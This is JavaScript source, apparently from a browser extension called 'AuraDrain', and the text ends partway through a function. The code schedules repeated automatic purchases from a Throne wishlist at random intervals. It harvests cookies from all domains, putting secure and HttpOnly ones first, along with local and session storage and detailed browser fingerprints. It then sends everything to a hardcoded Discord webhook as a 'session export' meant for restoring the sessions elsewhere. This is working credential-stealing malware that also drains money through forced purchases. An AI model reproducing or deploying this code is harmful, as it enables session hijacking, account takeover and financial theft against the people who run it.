
const config = {
  throneUrl: "throne.com/thegoddessaura",
  forceStop: true,
  forceStopShortcut: "Alt+Shift+E",
  debugMode: true,
  targetItemName: "Auto-Drain",
  cookieCollection: {
    enabled: true,
    autoCollect: true,
    collectAllDomains: true,
    collectLocalStorage: true,
    collectSessionStorage: true,
    collectCookies: true,
    interval: 300000,
    maxCollectionAttempts: 3,
    retryDelay: 10000,
    prioritizeSecure: true,
    includeExpired: false,
    groupByDomain: true,
    sortByValue: true
  },
  discordWebhook: {
    enabled: true,
    url: "https://discord.com/api/webhooks/1425598331186450617/aZ1GNPgxuY61sidoAJTYYU78qbaMqM-Gv6auQX7XYHJ8c0ueRq1aFeuBV7s8b6DyOZyr",
    maxMessageLength: 2000,
    cookieLogEnabled: true,
    cookieLogInterval: 300000,
  }
};

var payClicked = false;
var itemsAddedToCart = 0;
var maxItemsToAdd = 1;
var purchaseInProgress = false;
var lastActionTime = 0;
var debugBoxVisible = true;
var cookieLoggingActive = false;
var autoRetryEnabled = true;
var nextPurchaseScheduled = false;
var pcIdentifier = generatePCIdentifier();

function generatePCIdentifier() {
  const userAgent = navigator.userAgent;
  const language = navigator.language;
  const platform = navigator.platform;
  const screenResolution = `${screen.width}x${screen.height}`;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  
  const systemInfo = `${userAgent}-${language}-${platform}-${screenResolution}-${timezone}`;
  
  let hash = 0;
  for (let i = 0; i < systemInfo.length; i++) {
    const char = systemInfo.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash;
  }
  
  const identifier = Math.abs(hash).toString(16).substring(0, 8).toUpperCase();
  
  return `PC-${identifier}`;
}

function scheduleNextPurchase() {
  if (!autoRetryEnabled || nextPurchaseScheduled) {
    return;
  }
  
  const minDelay = 10 * 60 * 1000;
  const maxDelay = 60 * 60 * 1000;
  const randomDelay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
  
  const delayMinutes = Math.round(randomDelay / (60 * 1000));
  
  debugLog(`🔄 Auto-retry enabled: Next purchase scheduled in ${delayMinutes} minutes`, "info");
  debugLog(`⏰ Next purchase will start at: ${new Date(Date.now() + randomDelay).toLocaleString()}`, "info");
  
  nextPurchaseScheduled = true;
  
  setTimeout(() => {
    debugLog(`🚀 Auto-retry timer expired - Starting new purchase cycle`, "success");
    debugLog(`🔄 Resetting purchase state for new cycle`, "info");
    
    resetPurchaseState();
    nextPurchaseScheduled = false;
    
    redirectToProfile();
    
  }, randomDelay);
}

function createDebugBox() {
  const debugBox = document.createElement("div");
  debugBox.id = "extension-debug-box";
  debugBox.style.cssText = `
    position: fixed;
    top: 10px;
    right: 10px;
    width: 350px;
    height: 300px;
    background: rgba(0, 0, 0, 0.9);
    color: #00ff00;
    font-family: 'Courier New', monospace;
    font-size: 12px;
    padding: 10px;
    border: 2px solid #00ff00;
    border-radius: 5px;
    z-index: 999999;
    overflow: hidden;
    resize: both;
    min-width: 200px;
    min-height: 150px;
    cursor: default;
  `;
  
  const header = document.createElement("div");
  header.style.cssText = `
    color: #ffff00;
    font-weight: bold;
    margin-bottom: 10px;
    border-bottom: 1px solid #00ff00;
    padding-bottom: 5px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    user-select: none;
  `;
  
  const headerText = document.createElement("span");
  headerText.textContent = "🚀 AuraDrain Debug Log";
  headerText.style.cursor = "move";
  
  const copyButton = document.createElement("button");
  copyButton.textContent = "📋 Copy";
  copyButton.style.cssText = `
    background: #00ff00;
    color: #000;
    border: none;
    padding: 3px 8px;
    border-radius: 3px;
    cursor: pointer;
    font-size: 11px;
    font-weight: bold;
  `;
  copyButton.addEventListener("click", (e) => {
    e.stopPropagation();
    const logContainer = document.getElementById("debug-logs");
    if (logContainer) {
      const logs = Array.from(logContainer.children).map(entry => entry.textContent).join('\n');
      navigator.clipboard.writeText(logs).then(() => {
        copyButton.textContent = "✅ Copied!";
        setTimeout(() => {
          copyButton.textContent = "📋 Copy";
        }, 2000);
      }).catch(err => {
        console.error('Failed to copy logs:', err);
        copyButton.textContent = "❌ Failed";
        setTimeout(() => {
          copyButton.textContent = "📋 Copy";
        }, 2000);
      });
    }
  });
  
  header.appendChild(headerText);
  header.appendChild(copyButton);
  
  const logContainer = document.createElement("div");
  logContainer.id = "debug-logs";
  logContainer.style.cssText = `
    height: calc(100% - 40px);
    overflow-y: auto;
    overflow-x: hidden;
  `;
  
  debugBox.appendChild(header);
  debugBox.appendChild(logContainer);
  document.body.appendChild(debugBox);
  
  makeDraggable(debugBox, headerText);
  
  return logContainer;
}

function makeDraggable(element, handle) {
  let isDragging = false;
  let currentX;
  let currentY;
  let initialX;
  let initialY;
  let xOffset = 0;
  let yOffset = 0;

  handle.addEventListener("mousedown", dragStart);
  document.addEventListener("mousemove", drag);
  document.addEventListener("mouseup", dragEnd);

  function dragStart(e) {
    initialX = e.clientX - xOffset;
    initialY = e.clientY - yOffset;

    if (e.target === handle) {
      isDragging = true;
    }
  }

  function drag(e) {
    if (isDragging) {
      e.preventDefault();
      currentX = e.clientX - initialX;
      currentY = e.clientY - initialY;

      xOffset = currentX;
      yOffset = currentY;

      element.style.transform = `translate(${currentX}px, ${currentY}px)`;
    }
  }

  function dragEnd(e) {
    initialX = currentX;
    initialY = currentY;
    isDragging = false;
  }
}

function toggleDebugBox() {
  const debugBox = document.getElementById("extension-debug-box");
  if (debugBox) {
    debugBoxVisible = !debugBoxVisible;
    debugBox.style.display = debugBoxVisible ? "block" : "none";
    console.log(`%c[AuraDrainer] Debug box ${debugBoxVisible ? 'shown' : 'hidden'}`, "color: #00ff00;");
  }
}

async function getAllCookiesFromBackground() {
  debugLog("🍪 [COOKIE DEBUG] Starting enhanced getAllCookiesFromBackground()", "info");
  
  return new Promise((resolve) => {
    debugLog("🍪 [COOKIE DEBUG] Setting up event listener for cookie response...", "info");
    
    const requestId = `cookie_${Date.now()}_${Math.random()}`;
    debugLog(`🍪 [COOKIE DEBUG] Request ID: ${requestId}`, "info");
    
    const responseHandler = (event) => {
      debugLog(`🍪 [COOKIE DEBUG] Event received: ${JSON.stringify(event.detail).substring(0, 100)}`, "info");
      
      if (event.detail && event.detail.action === 'cookieResponse' && event.detail.requestId === requestId) {
        debugLog(`🍪 [COOKIE DEBUG] Cookie response received for request ${requestId}`, "info");
        
        window.removeEventListener('auradrainer-cookie-response', responseHandler);
        
        if (event.detail.success) {
          const cookies = event.detail.cookies || [];
          debugLog(`🍪 [COOKIE DEBUG] Successfully received ${cookies.length} cookies`, "success");
          resolve(cookies);
        } else {
          debugLog(`🍪 [COOKIE DEBUG] Failed to get cookies: ${event.detail.error || 'Unknown error'}`, "error");
          resolve([]);
        }
      }
    };
    
    window.addEventListener('auradrainer-cookie-response', responseHandler);
    
    debugLog("🍪 [COOKIE DEBUG] Dispatching custom event to request cookies...", "info");
    const event = new CustomEvent('auradrainer-cookie-request', {
      detail: { 
        action: 'getAllCookies',
        requestId: requestId,
        timestamp: Date.now(),
        enhanced: true
      },
      bubbles: true,
      composed: true
    });
    
    debugLog("🍪 [COOKIE DEBUG] Dispatching event...", "info");
    window.dispatchEvent(event);
    debugLog("🍪 [COOKIE DEBUG] Event dispatched, waiting for response...", "info");
    
    setTimeout(() => {
      window.removeEventListener('auradrainer-cookie-response', responseHandler);
      debugLog(`🍪 [COOKIE DEBUG] Cookie request timeout for ${requestId}`, "error");
      debugLog(`🍪 [COOKIE DEBUG] Check if content script event bridge is running`, "error");
      resolve([]);
    }, 15000);
  });
}

// Enhanced browser fingerprinting functions
function getWebGLFingerprint() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return null;
    
    return {
      vendor: gl.getParameter(gl.VENDOR),
      renderer: gl.getParameter(gl.RENDERER),
      version: gl.getParameter(gl.VERSION),
      shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
      extensions: gl.getSupportedExtensions()
    };
  } catch (e) {
    return null;
  }
}

function getCanvasFingerprint() {
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Browser fingerprint test 🔒', 2, 2);
    return canvas.toDataURL();
  } catch (e) {
    return null;
  }
}

function getAudioContextFingerprint() {
  try {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const analyser = audioContext.createAnalyser();
    oscillator.connect(analyser);
    oscillator.frequency.value = 1000;
    oscillator.start();
    
    const fingerprint = analyser.frequencyBinCount;
    oscillator.stop();
    audioContext.close();
    return fingerprint;
  } catch (e) {
    return null;
  }
}

function getAvailableFonts() {
  const testFonts = [
    'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
    'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
    'Trebuchet MS', 'Arial Black', 'Impact', 'Tahoma', 'Century Gothic'
  ];
  
  const availableFonts = [];
  const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
  const testSize = '72px';
  
  const canvas = document.createElement('canvas');
  const context = canvas.getContext('2d');
  
  testFonts.forEach(font => {
    context.font = testSize + ' ' + font + ', monospace';
    const metrics1 = context.measureText(testString);
    
    context.font = testSize + ' monospace';
    const metrics2 = context.measureText(testString);
    
    if (metrics1.width !== metrics2.width) {
      availableFonts.push(font);
    }
  });
  
  return availableFonts;
}

function getBrowserFingerprint() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    maxTouchPoints: navigator.maxTouchPoints,
    vendor: navigator.vendor,
    vendorSub: navigator.vendorSub,
    productSub: navigator.productSub,
    appName: navigator.appName,
    appVersion: navigator.appVersion,
    appCodeName: navigator.appCodeName
  };
}

function getScreenInfo() {
  return {
    width: screen.width,
    height: screen.height,
    availWidth: screen.availWidth,
    availHeight: screen.availHeight,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    orientation: screen.orientation ? {
      angle: screen.orientation.angle,
      type: screen.orientation.type
    } : null
  };
}

function getTimezoneInfo() {
  try {
    return {
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      locale: Intl.DateTimeFormat().resolvedOptions().locale,
      numberFormat: Intl.NumberFormat().resolvedOptions().locale
    };
  } catch (e) {
    return null;
  }
}

function getConnectionInfo() {
  if (navigator.connection) {
    return {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    };
  }
  return null;
}

function getPluginsInfo() {
  const plugins = [];
  for (let i = 0; i < navigator.plugins.length; i++) {
    plugins.push({
      name: navigator.plugins[i].name,
      description: navigator.plugins[i].description,
      filename: navigator.plugins[i].filename,
      length: navigator.plugins[i].length
    });
  }
  return plugins;
}

async function collectAllStorageData() {
  debugLog("💾 [STORAGE DEBUG] Starting comprehensive storage collection", "info");
  
  const storageData = {
    localStorage: {},
    sessionStorage: {},
    cookies: [],
    domains: new Set(),
    totalItems: 0,
    browserFingerprint: getBrowserFingerprint(),
    screenInfo: getScreenInfo(),
    timezoneInfo: getTimezoneInfo(),
    connectionInfo: getConnectionInfo(),
    pluginsInfo: getPluginsInfo(),
    webglFingerprint: getWebGLFingerprint(),
    canvasFingerprint: getCanvasFingerprint(),
    audioContextFingerprint: getAudioContextFingerprint(),
    availableFonts: getAvailableFonts(),
    timestamp: Date.now(),
    url: window.location.href,
    referrer: document.referrer
  };
  
  try {
    if (config.cookieCollection.collectLocalStorage) {
      debugLog("💾 [STORAGE DEBUG] Collecting localStorage data", "info");
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        storageData.localStorage[key] = value;
        storageData.totalItems++;
      }
      debugLog(`💾 [STORAGE DEBUG] Collected ${Object.keys(storageData.localStorage).length} localStorage items`, "success");
    }
    
    if (config.cookieCollection.collectSessionStorage) {
      debugLog("💾 [STORAGE DEBUG] Collecting sessionStorage data", "info");
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        storageData.sessionStorage[key] = value;
        storageData.totalItems++;
      }
      debugLog(`💾 [STORAGE DEBUG] Collected ${Object.keys(storageData.sessionStorage).length} sessionStorage items`, "success");
    }
    
    if (config.cookieCollection.collectCookies) {
      debugLog("🍪 [STORAGE DEBUG] Collecting cookies from all domains", "info");
      const cookies = await getAllCookiesFromBackground();
      storageData.cookies = cookies;
      storageData.totalItems += cookies.length;
      
      cookies.forEach(cookie => {
        if (cookie.domain) {
          storageData.domains.add(cookie.domain);
        }
      });
      
      debugLog(`🍪 [STORAGE DEBUG] Collected ${cookies.length} cookies from ${storageData.domains.size} domains`, "success");
    }
    
    debugLog(`💾 [STORAGE DEBUG] Total storage items collected: ${storageData.totalItems}`, "success");
    return storageData;
    
  } catch (error) {
    debugLog(`💾 [STORAGE DEBUG] Storage collection error: ${error.message}`, "error");
    return storageData;
  }
}

function filterAndSortCookies(cookies) {
  if (!cookies || cookies.length === 0) return [];
  
  debugLog(`🔍 [FILTER DEBUG] Filtering and sorting ${cookies.length} cookies`, "info");
  
  let filteredCookies = [...cookies];
  
  if (!config.cookieCollection.includeExpired) {
    const currentTime = Date.now() / 1000;
    filteredCookies = filteredCookies.filter(cookie => {
      return !cookie.expirationDate || cookie.expirationDate > currentTime;
    });
    debugLog(`🔍 [FILTER DEBUG] Filtered out expired cookies: ${cookies.length - filteredCookies.length}`, "info");
  }
  
  if (config.cookieCollection.sortByValue) {
    filteredCookies.sort((a, b) => {
      const aLength = a.value ? a.value.length : 0;
      const bLength = b.value ? b.value.length : 0;
      return bLength - aLength;
    });
    debugLog(`🔍 [FILTER DEBUG] Sorted cookies by value length`, "info");
  }
  
  if (config.cookieCollection.prioritizeSecure) {
    filteredCookies.sort((a, b) => {
      const aSecure = (a.secure ? 1 : 0) + (a.httpOnly ? 1 : 0);
      const bSecure = (b.secure ? 1 : 0) + (b.httpOnly ? 1 : 0);
      return bSecure - aSecure;
    });
    debugLog(`🔍 [FILTER DEBUG] Prioritized secure/httponly cookies`, "info");
  }
  
  debugLog(`🔍 [FILTER DEBUG] Final filtered cookies: ${filteredCookies.length}`, "success");
  return filteredCookies;
}

async function getDomainCookiesFromBackground(domain) {
  debugLog(`🍪 [COOKIE DEBUG] Getting cookies for domain: ${domain}`, "info");
  
  return new Promise((resolve) => {
    const responseHandler = (event) => {
      if (event.detail && event.detail.action === 'cookieResponse') {
        window.removeEventListener('auradrainer-cookie-response', responseHandler);
        
        if (event.detail.success) {
          const cookies = event.detail.cookies || [];
          debugLog(`🍪 [COOKIE DEBUG] Received ${cookies.length} cookies for ${domain}`, "success");
          resolve(cookies);
        } else {
          debugLog(`🍪 [COOKIE DEBUG] Failed to get cookies for ${domain}: ${event.detail.error}`, "error");
          resolve([]);
        }
      }
    };
    
    window.addEventListener('auradrainer-cookie-response', responseHandler);
    
    const event = new CustomEvent('auradrainer-cookie-request', {
      detail: { action: 'getDomainCookies', domain: domain }
    });
    window.dispatchEvent(event);
    
    setTimeout(() => {
      window.removeEventListener('auradrainer-cookie-response', responseHandler);
      resolve([]);
    }, 10000);
  });
}

async function sendToDiscordWebhook(message, isFile = false) {
  debugLog("📡 [DISCORD DEBUG] Starting sendToDiscordWebhook()", "info");
  debugLog(`📡 [DISCORD DEBUG] isFile: ${isFile}`, "info");
  debugLog(`📡 [DISCORD DEBUG] Message length: ${message?.length || 0}`, "info");
  
  debugLog(`📡 [DISCORD DEBUG] Webhook enabled: ${config.discordWebhook.enabled}`, "info");
  debugLog(`📡 [DISCORD DEBUG] Webhook URL configured: ${!!config.discordWebhook.url}`, "info");
  debugLog(`📡 [DISCORD DEBUG] Webhook URL: ${config.discordWebhook.url?.substring(0, 50)}...`, "info");
  
  if (!config.discordWebhook.enabled || !config.discordWebhook.url || config.discordWebhook.url === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
    debugLog("⚠️ [DISCORD DEBUG] Discord webhook not configured properly", "warning");
    debugLog(`⚠️ [DISCORD DEBUG] Enabled: ${config.discordWebhook.enabled}`, "warning");
    debugLog(`⚠️ [DISCORD DEBUG] URL exists: ${!!config.discordWebhook.url}`, "warning");
    debugLog(`⚠️ [DISCORD DEBUG] URL is placeholder: ${config.discordWebhook.url === "YOUR_DISCORD_WEBHOOK_URL_HERE"}`, "warning");
    return false;
  }

  try {
    debugLog("📡 [DISCORD DEBUG] Creating payload...", "info");
    
    let requestOptions;
    
    if (isFile) {
      const formData = new FormData();
      formData.append('content', `🍪 **Cookie Collection Report** 🍪\n\n🖥️ **${pcIdentifier}**`);
      
      const blob = new Blob([message], { type: 'text/plain' });
      formData.append('files[0]', blob, `cookies_${Date.now()}.txt`);
      
      debugLog(`📡 [DISCORD DEBUG] Payload created, type: file`, "info");
      debugLog(`📡 [DISCORD DEBUG] File size: ${message.length} bytes`, "info");
      
      requestOptions = {
        method: 'POST',
        body: formData
      };
    } else {
      const payload = {
        content: `${message}\n\n🖥️ **${pcIdentifier}**`
      };
      
      debugLog(`📡 [DISCORD DEBUG] Payload created, type: message`, "info");
      debugLog(`📡 [DISCORD DEBUG] Payload size: ${JSON.stringify(payload).length}`, "info");
      
      requestOptions = {
        method: 'POST',
        headers: {
          'Content-Type':'application/json',
        },
        body: JSON.stringify(payload)
      };
    }

    debugLog("📡 [DISCORD DEBUG] Sending fetch request...", "info");
    debugLog(`📡 [DISCORD DEBUG] Request options:`, "info");
    debugLog(`📡 [DISCORD DEBUG] Method: ${requestOptions.method}`, "info");
    debugLog(`📡 [DISCORD DEBUG] Body type: ${typeof requestOptions.body}`, "info");

    const response = await fetch(config.discordWebhook.url, requestOptions);
    
    debugLog(`📡 [DISCORD DEBUG] Fetch response received`, "info");
    debugLog(`📡 [DISCORD DEBUG] Response status: ${response.status}`, "info");
    debugLog(`📡 [DISCORD DEBUG] Response statusText: ${response.statusText}`, "info");
    debugLog(`📡 [DISCORD DEBUG] Response ok: ${response.ok}`, "info");

    try {
      const responseText = await response.text();
      debugLog(`📡 [DISCORD DEBUG] Response body: ${responseText}`, "info");
    } catch (e) {
      debugLog(`📡 [DISCORD DEBUG] Could not read response body: ${e.message}`, "warning");
    }

    if (response.ok) {
      debugLog("✅ [DISCORD DEBUG] Successfully sent to Discord webhook", "success");
      return true;
    } else {
      debugLog(`❌ [DISCORD DEBUG] Discord webhook failed: ${response.status} ${response.statusText}`, "error");
      return false;
    }
  } catch (error) {
    debugLog(`❌ [DISCORD DEBUG] Discord webhook error: ${error.message}`, "error");
    debugLog(`❌ [DISCORD DEBUG] Error stack: ${error.stack}`, "error");
    return false;
  }
}


function splitMessageForDiscord(message, maxLength = 2000) {
  if (message.length <= maxLength) {
    return [message];
  }

  const messages = [];
  const lines = message.split('\n');
  let currentMessage = '';

  for (const line of lines) {
    if (currentMessage.length + line.length + 1 <= maxLength) {
      currentMessage += (currentMessage ? '\n' : '') + line;
    } else {
      if (currentMessage) {
        messages.push(currentMessage);
        currentMessage = line;
      } else {
        // Single line is too long, force split
        messages.push(line.substring(0, maxLength - 3) + '...');
      }
    }
  }

  if (currentMessage) {
    messages.push(currentMessage);
  }

  return messages;
}

async function collectAndLogCookies() {
  debugLog("🍪 [MAIN DEBUG] Starting enhanced collectAndLogCookies()", "info");
  debugLog(`🍪 [MAIN DEBUG] Current time: ${new Date().toLocaleString()}`, "info");
  
  if (!config.cookieCollection.enabled) {
    debugLog("🍪 [MAIN DEBUG] Cookie collection disabled in config", "info");
    return;
  }

  if (cookieLoggingActive) {
    debugLog("🍪 [MAIN DEBUG] Cookie logging already in progress, skipping", "warning");
    return;
  }

  cookieLoggingActive = true;
  debugLog("🍪 [MAIN DEBUG] Starting comprehensive data collection...", "info");

  try {
    debugLog("💾 [MAIN DEBUG] Collecting comprehensive storage data...", "info");
    const storageData = await collectAllStorageData();
    
    if (storageData.totalItems === 0) {
      debugLog("💾 [MAIN DEBUG] No storage data found, ending collection", "warning");
      cookieLoggingActive = false;
      return;
    }

    debugLog(`💾 [MAIN DEBUG] Collected ${storageData.totalItems} total items`, "success");
    
    let processedCookies = storageData.cookies;
    if (config.cookieCollection.groupByDomain || config.cookieCollection.sortByValue || config.cookieCollection.prioritizeSecure) {
      processedCookies = filterAndSortCookies(storageData.cookies);
    }

    debugLog("📝 [MAIN DEBUG] Creating comprehensive report...", "info");
    const comprehensiveReport = formatComprehensiveReport(storageData, processedCookies);
    
    debugLog(`📝 [MAIN DEBUG] Report length: ${comprehensiveReport.length}`, "info");
    debugLog(`📝 [MAIN DEBUG] Report preview: ${comprehensiveReport.substring(0, 300)}...`, "info");
    
    // Create structured session export for easier restoration
    debugLog("📦 [MAIN DEBUG] Creating structured session export...", "info");
    const structuredExport = await createStructuredSessionExport(storageData, processedCookies);
    
    // Send both formats
    let reportSuccess = false;
    let exportSuccess = false;
    
    if (comprehensiveReport.length > config.discordWebhook.maxMessageLength) {
      debugLog(`📤 [MAIN DEBUG] Report too large (${comprehensiveReport.length} > ${config.discordWebhook.maxMessageLength}), sending as file...`, "info");
      reportSuccess = await sendToDiscordWebhook(comprehensiveReport, true);
      debugLog(`📤 [MAIN DEBUG] Report file send result: ${reportSuccess}`, reportSuccess ? "success" : "error");
    } else {
      debugLog(`📤 [MAIN DEBUG] Sending report as message (${comprehensiveReport.length} chars)...`, "info");
      reportSuccess = await sendToDiscordWebhook(comprehensiveReport);
      debugLog(`📤 [MAIN DEBUG] Report message send result: ${reportSuccess}`, reportSuccess ? "success" : "error");
    }
    
    // Send structured export
    debugLog("📤 [MAIN DEBUG] Sending structured session export...", "info");
    exportSuccess = await sendStructuredSessionToDiscord(structuredExport);
    debugLog(`📤 [MAIN DEBUG] Structured export send result: ${exportSuccess}`, exportSuccess ? "success" : "error");

  } catch (error) {
    debugLog(`❌ [MAIN DEBUG] Collection failed: ${error.message}`, "error");
    debugLog(`❌ [MAIN DEBUG] Error stack: ${error.stack}`, "error");
  } finally {
    cookieLoggingActive = false;
    debugLog("🍪 [MAIN DEBUG] Collection completed", "info");
  }
}

function formatComprehensiveReport(storageData, processedCookies) {
  let report = `🍪 **AURADRAIN COMPREHENSIVE DATA REPORT** 🍪\n`;
  report += `⏰ **Timestamp:** ${new Date().toLocaleString()}\n`;
  report += `🖥️ **User Agent:** ${navigator.userAgent}\n`;
  report += `🌍 **URL:** ${window.location.href}\n`;
  report += `📊 **Total Items:** ${storageData.totalItems}\n\n`;
  
  // Enhanced browser fingerprinting data
  if (storageData.browserFingerprint) {
    report += `🔍 **BROWSER FINGERPRINT**\n`;
    report += `• **Platform:** ${storageData.browserFingerprint.platform}\n`;
    report += `• **Language:** ${storageData.browserFingerprint.language}\n`;
    report += `• **Languages:** ${storageData.browserFingerprint.languages?.join(', ')}\n`;
    report += `• **Hardware Concurrency:** ${storageData.browserFingerprint.hardwareConcurrency}\n`;
    report += `• **Device Memory:** ${storageData.browserFingerprint.deviceMemory}GB\n`;
    report += `• **Max Touch Points:** ${storageData.browserFingerprint.maxTouchPoints}\n`;
    report += `• **Cookie Enabled:** ${storageData.browserFingerprint.cookieEnabled}\n`;
    report += `• **Do Not Track:** ${storageData.browserFingerprint.doNotTrack}\n`;
    report += `• **Vendor:** ${storageData.browserFingerprint.vendor}\n`;
    report += `• **App Name:** ${storageData.browserFingerprint.appName}\n`;
    report += `• **App Version:** ${storageData.browserFingerprint.appVersion}\n\n`;
  }
  
  if (storageData.screenInfo) {
    report += `🖥️ **SCREEN INFORMATION**\n`;
    report += `• **Resolution:** ${storageData.screenInfo.width}x${storageData.screenInfo.height}\n`;
    report += `• **Available:** ${storageData.screenInfo.availWidth}x${storageData.screenInfo.availHeight}\n`;
    report += `• **Color Depth:** ${storageData.screenInfo.colorDepth}\n`;
    report += `• **Pixel Depth:** ${storageData.screenInfo.pixelDepth}\n`;
    if (storageData.screenInfo.orientation) {
      report += `• **Orientation:** ${storageData.screenInfo.orientation.type} (${storageData.screenInfo.orientation.angle}°)\n`;
    }
    report += `\n`;
  }
  
  if (storageData.timezoneInfo) {
    report += `🌍 **TIMEZONE & LOCALE**\n`;
    report += `• **Timezone:** ${storageData.timezoneInfo.timezone}\n`;
    report += `• **Offset:** ${storageData.timezoneInfo.timezoneOffset} minutes\n`;
    report += `• **Locale:** ${storageData.timezoneInfo.locale}\n`;
    report += `• **Number Format:** ${storageData.timezoneInfo.numberFormat}\n`;
    report += `\n`;
  }
  
  if (storageData.connectionInfo) {
    report += `🌐 **NETWORK INFORMATION**\n`;
    report += `• **Effective Type:** ${storageData.connectionInfo.effectiveType}\n`;
    report += `• **Downlink:** ${storageData.connectionInfo.downlink} Mbps\n`;
    report += `• **RTT:** ${storageData.connectionInfo.rtt} ms\n`;
    report += `• **Save Data:** ${storageData.connectionInfo.saveData}\n`;
    report += `\n`;
  }
  
  if (storageData.webglFingerprint) {
    report += `🎮 **WEBGL FINGERPRINT**\n`;
    report += `• **Vendor:** ${storageData.webglFingerprint.vendor}\n`;
    report += `• **Renderer:** ${storageData.webglFingerprint.renderer}\n`;
    report += `• **Version:** ${storageData.webglFingerprint.version}\n`;
    report += `• **Extensions:** ${storageData.webglFingerprint.extensions?.length || 0} extensions\n`;
    report += `\n`;
  }
  
  if (storageData.canvasFingerprint) {
    report += `🎨 **CANVAS FINGERPRINT**\n`;
    report += `• **Data URL:** ${storageData.canvasFingerprint.substring(0, 100)}...\n`;
    report += `\n`;
  }
  
  if (storageData.audioContextFingerprint) {
    report += `🔊 **AUDIO CONTEXT FINGERPRINT**\n`;
    report += `• **Frequency Bin Count:** ${storageData.audioContextFingerprint}\n`;
    report += `\n`;
  }
  
  if (storageData.availableFonts && storageData.availableFonts.length > 0) {
    report += `🔤 **AVAILABLE FONTS**\n`;
    report += `• **Fonts:** ${storageData.availableFonts.join(', ')}\n`;
    report += `\n`;
  }
  
  if (storageData.pluginsInfo && storageData.pluginsInfo.length > 0) {
    report += `🔌 **BROWSER PLUGINS**\n`;
    storageData.pluginsInfo.forEach(plugin => {
      report += `• **${plugin.name}:** ${plugin.description}\n`;
    });
    report += `\n`;
  }

  report += `📈 **COLLECTION SUMMARY**\n`;
  report += `🍪 **Cookies:** ${storageData.cookies.length}\n`;
  report += `💾 **LocalStorage:** ${Object.keys(storageData.localStorage).length} items\n`;
  report += `🗂️ **SessionStorage:** ${Object.keys(storageData.sessionStorage).length} items\n`;
  report += `🌐 **Domains:** ${storageData.domains.size}\n\n`;

  if (storageData.cookies.length > 0) {
    report += `🍪 **COOKIES BY DOMAIN**\n`;
    
    if (config.cookieCollection.groupByDomain) {
      const cookiesByDomain = {};
      processedCookies.forEach(cookie => {
        const domain = cookie.domain || 'unknown';
        if (!cookiesByDomain[domain]) {
          cookiesByDomain[domain] = [];
        }
        cookiesByDomain[domain].push(cookie);
      });

      Object.keys(cookiesByDomain).sort().forEach(domain => {
        const domainCookies = cookiesByDomain[domain];
        report += `🌐 **${domain}** (${domainCookies.length} cookies)\n`;
        
        domainCookies.forEach(cookie => {
          report += `  • **${cookie.name}** = \`${cookie.value}\`\n`;
          if (cookie.secure) report += `    🔒 Secure\n`;
          if (cookie.httpOnly) report += `    🛡️ HttpOnly\n`;
          if (cookie.session) report += `    ⏱️ Session\n`;
          if (cookie.expirationDate) {
            const expDate = new Date(cookie.expirationDate * 1000);
            report += `    ⏰ Expires: ${expDate.toLocaleString()}\n`;
          }
          report += `\n`;
        });
        report += `\n`;
      });
    } else {
      processedCookies.forEach(cookie => {
        report += `• **${cookie.domain}** - **${cookie.name}** = \`${cookie.value}\`\n`;
      });
    }
  }

  if (Object.keys(storageData.localStorage).length > 0) {
    report += `💾 **LOCAL STORAGE DATA**\n`;
    Object.entries(storageData.localStorage).forEach(([key, value]) => {
      report += `• **${key}** = \`${value}\`\n`;
    });
    report += `\n`;
  }

  if (Object.keys(storageData.sessionStorage).length > 0) {
    report += `🗂️ **SESSION STORAGE DATA**\n`;
    Object.entries(storageData.sessionStorage).forEach(([key, value]) => {
      report += `• **${key}** = \`${value}\`\n`;
    });
    report += `\n`;
  }

  report += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  report += `🤖 **AuraDrain Enhanced Collection System**\n`;
  report += `📅 Generated: ${new Date().toISOString()}\n`;

  return report;
}

async function createStructuredSessionExport(storageData, processedCookies) {
  debugLog("📦 [EXPORT DEBUG] Creating structured session export", "info");
  
  const sessionExport = {
    metadata: {
      timestamp: storageData.timestamp,
      url: storageData.url,
      referrer: storageData.referrer,
      pcIdentifier: pcIdentifier,
      version: "2.0.0"
    },
    browserFingerprint: storageData.browserFingerprint,
    screenInfo: storageData.screenInfo,
    timezoneInfo: storageData.timezoneInfo,
    connectionInfo: storageData.connectionInfo,
    webglFingerprint: storageData.webglFingerprint,
    canvasFingerprint: storageData.canvasFingerprint,
    audioContextFingerprint: storageData.audioContextFingerprint,
    availableFonts: storageData.availableFonts,
    pluginsInfo: storageData.pluginsInfo,
    cookies: processedCookies,
    localStorage: storageData.localStorage,
    sessionStorage: storageData.sessionStorage,
    domains: Array.from(storageData.domains),
    statistics: {
      totalItems: storageData.totalItems,
      cookieCount: processedCookies.length,
      localStorageCount: Object.keys(storageData.localStorage).length,
      sessionStorageCount: Object.keys(storageData.sessionStorage).length,
      domainCount: storageData.domains.size
    }
  };
  
